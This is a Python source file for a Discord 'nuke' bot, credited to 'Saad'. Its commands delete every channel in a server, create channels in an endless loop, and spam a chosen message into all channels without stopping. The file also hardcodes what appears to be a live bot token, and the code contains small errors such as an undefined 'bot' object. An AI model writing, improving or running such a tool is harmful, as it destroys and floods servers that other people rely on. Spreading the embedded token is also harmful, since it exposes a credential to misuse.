import discord
from discord.ext import commands
from discord import embeds
from discord.colour import Color 

client = commands.Bot(command_prefix = '.')
bot.remove_command('help')
token = 'ODM1NTI2OTI1MTI3NTE2MjIx.YIQvFg.hdn7b7WgAI8S3-1XDeWYTXWd3Oo'

@client.command()
async def destroy (ctx,message):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted")
        except:
             pass
    for i in range(1):
        await guild.create_text_channel(f"{message}")
    while True:
        for channel in guild.text_channels:
            for i in range (1):
                await guild.create_text_channel(f"{message}")
 

@client.command()
async def s(ctx, *, message ):
  guild=ctx.message.guild
  await ctx.message.delete()
  for i in range(2):
    print("spammed")
    while True:
           for channel in guild.text_channels:
                 await channel.send(f"{message}")

@client.command()
async def cda(ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass   


@client.command()
async def commands(ctx):
 
  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
  embed.set_footer(text="developed by Saad.")

  await ctx.send(embed=embed)

@client.run(token)
